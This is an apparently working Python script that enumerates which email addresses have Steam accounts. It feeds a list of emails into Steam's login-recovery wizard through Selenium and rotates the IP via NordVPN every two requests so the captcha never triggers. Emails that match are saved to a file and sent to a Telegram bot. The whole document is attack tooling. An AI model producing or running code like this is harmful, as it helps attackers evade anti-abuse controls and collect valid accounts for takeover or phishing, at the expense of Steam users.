from selenium import webdriver
import time
from subprocess import call
from requests import get
import requests
from random import randint
import datetime
import pyautogui
#function bot definition
def telegram_bot_sendtext(bot_message):
    
    bot_token = ''
    bot_chatID = ''
    send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + '&parse_mode=Markdown&text=' + bot_message

    response = requests.get(send_text)

    return response.json()
def change_IP():
	dir = r"C:\Program Files (x86)\NordVPN"
	cmdline = "nordvpn -c -n"
	cmdline1 = "nordvpn -c -g"
	state = ' "United States #'
	stato =['"United Kingdom"','"France"','"Germany"','"Netherlands"','"Italy"','"Sweden"','"Canada"','"Belgium"','"Denmark"','"Spain"','"Ireland"','"Czech Republic"','"Croatia"','"Austria"']
	tag = 3383
	chiuso = '" '
	ipnew= ""
	mioip=""
	bool = 0
	e=0
	ipold=get('https://api.ipify.org').text
	rc = call("start cmd /c " + cmdline+state+str(tag)+chiuso, cwd=dir, shell=True)#change ip with nordvpn
	print("Cambio ip");
	while bool!=1:#check ip changed
					try:
						print("Richiesta api")
						ipnew = get('https://api.ipify.org').text
						print ('My public IP address is:', ipnew)
						print("My old public IP address :",ipold)
						if (ipnew!=ipold)and(ipnew!=mioip):
							bool = 1
							print("Continuo")
							ipold=ipnew
							e=0
						else:
							e+=1
							print("Errore!!")	
							if(e>5):
	
								value = randint(0, 6)
								print(stato[value])
								rc = call("start cmd /C " + cmdline1+stato[value], cwd=dir, shell=True)#change ip with nordvpn
								e=0
								time.sleep(1)
					except:
						print("IP MISSING")
						time.sleep(1)
	tag+=1
	bool=0
	print(tag)
def setup():
	rc = call("start cmd /c mkdir screen", shell=True)#change ip with nordvpn
def screen(j):
	myScreenshot = pyautogui.screenshot()
	myScreenshot.save(r'screen\file name'+str(j)+'.png')
	j+=1
#declaretion 
i=0
j=0
f = open("mail1.txt", "r")#open file with mail
f2=open("trovati.txt","w")
f1 = f.readlines()#read all mail
setup()
browser = webdriver.Chrome()#open chrome
browser.get("https://help.steampowered.com/it/wizard/HelpWithLoginInfo?issueid=406")#goes to the desired site
 #while some email still be in the file (f1) continue the for
for x in f1:
	try:
			start = datetime.datetime.now()
			if browser.find_element_by_id("forgot_login_search").is_displayed():
				username = browser.find_element_by_id("forgot_login_search")
				username.send_keys(x)
				time.sleep(1)
				browser.find_element_by_xpath("//input[@type='submit' and @value='Ricerca']").click()
				screen(j)
				time.sleep(1)
				i+=1
				print(i)
						
			e=0
			if (i % 2) ==0:#change ip for not get captcha
				change_IP()
				end = datetime.datetime.now()
				elapsed = end - start
				print(elapsed)

	except :
				print("TROVATOOOO")
				time.sleep(2)
				browser.get("https://help.steampowered.com/it/wizard/HelpWithLoginInfo?issueid=406")#goes to the desired site
				msg = telegram_bot_sendtext("TROVATO : "+x)
				f2.write(x)
				i=i+1
				print(i)
			
	browser.refresh()#refresh
	
